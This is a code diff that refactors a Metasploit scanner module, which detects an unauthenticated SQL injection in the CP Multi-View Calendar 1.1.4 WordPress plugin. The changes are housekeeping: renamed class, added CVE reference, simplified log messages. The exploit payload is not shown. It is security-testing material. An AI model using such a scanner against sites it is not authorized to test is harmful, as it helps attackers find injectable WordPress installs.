@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'uri'
-require 'msf/core'
 
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -27,14 +25,15 @@ class Metasploit4 < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'References'  =>
         [
-          [ 'EDB', '36243'],
+          [ 'CVE' , '2014-8586' ],
+          [ 'EDB', '36243' ],
           [ 'WPVDB', '7910' ]
         ],
       'DisclosureDate' => 'Mar 03 2015'))
 
     register_options([
       OptString.new('TARGETURI', [true, 'Target URI of the Wordpress instance', '/'])
-    ], self.class)
+    ])
   end
 
   def run_host(ip)
@@ -42,7 +41,7 @@ class Metasploit4 < Msf::Auxiliary
     left_marker = Rex::Text.rand_text_alpha(5)
     flag = Rex::Text.rand_text_alpha(5)
 
-    vprint_status("#{peer} - Checking host")
+    vprint_status("Checking host")
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, '/'),
@@ -55,14 +54,14 @@ class Metasploit4 < Msf::Auxiliary
     })
 
     unless res && res.body
-      vprint_error("#{peer} - Server did not respond in an expected way")
+      vprint_error("Server did not respond in an expected way")
       return
     end
 
     result = res.body =~ /#{left_marker}#{flag}#{right_marker}/
 
     if result
-      print_good("#{peer} - Vulnerable to unauthenticated SQL injection within CP Multi-View Calendar 1.1.4 for Wordpress")
+      print_good("Vulnerable to unauthenticated SQL injection within CP Multi-View Calendar 1.1.4 for Wordpress")
       report_vuln({
         :host  => rhost,
         :port  => rport,
